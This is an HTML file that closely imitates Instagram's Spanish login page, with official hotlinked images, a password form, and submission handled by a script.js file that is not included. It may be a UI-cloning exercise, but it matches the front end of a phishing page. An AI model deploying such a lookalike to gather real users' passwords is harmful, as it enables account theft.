<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <link rel="icon" href="/logo.png" type="image/png">
  <link rel="stylesheet" href="style.css">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
</head>

<body>
  <div class="container">
    <div class="phone-mockup">
      <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe239b7c9f.png"
        alt="Instagram screenshot" class="screenshot">
    </div>

    <div class="login-section">
      <div class="login-box">
        <div class="logo">
          <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
            alt="Instagram" style="width: 175px; height: auto;">
        </div>

        <form id="loginForm">
          <input type="text" id="username" placeholder="Teléfono, usuario o correo electrónico" required
            autocomplete="username">
          <input type="password" id="password" placeholder="Contraseña" required autocomplete="current-password">
          <button type="submit" class="login-btn">Entrar</button>
        </form>

        <div class="divider">
          <div class="line"></div>
          <span>O</span>
          <div class="line"></div>
        </div>

        <a href="#" class="fb-login">
          <svg aria-label="Facebook" fill="#385185" height="16" viewBox="0 0 24 24" width="16">
            <path
              d="M20.656.195C18.952.195 17.031.195 15.328.195c-2.422 0-3.703 1.328-3.703 3.516v2.578H8.672v3.984h2.953v11.532h4.922V10.273h3.281l.469-3.984h-3.75V4.336c0-.938.234-1.406 1.406-1.406h2.344V.195z">
            </path>
          </svg>
          <span>Iniciar sesión con Facebook</span>
        </a>

        <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
      </div>

      <div class="signup-box">
        <p>¿No tienes una cuenta? <a href="#">Regístrate</a></p>
      </div>

      <div class="get-app">
        <p>Descarga la aplicación.</p>
        <div class="app-buttons">
          <a href="#"><img
              src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_spanish-es.png/4b70f6fae447.png"
              alt="Descárgala en App Store"></a>
          <a href="#"><img
              src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_spanish-es.png/f06b908907d5.png"
              alt="Disponible en Google Play"></a>
        </div>
      </div>
    </div>
  </div>

  <footer>
    <div class="footer-links">
      <a href="#">Meta</a>
      <a href="#">Información</a>
      <a href="#">Blog</a>
      <a href="#">Empleo</a>
      <a href="#">Ayuda</a>
      <a href="#">API</a>
      <a href="#">Privacidad</a>
      <a href="#">Condiciones</a>
      <a href="#">Ubicaciones</a>
      <a href="#">Instagram Lite</a>
      <a href="#">Threads</a>
      <a href="#">Subir contactos</a>
      <a href="#">Meta Verified</a>
    </div>
    <div class="footer-bottom">
      <span>Español</span>
      <span>© 2026 Instagram from Meta</span>
    </div>
  </footer>

  <script src="script.js"></script>
</body>

</html>
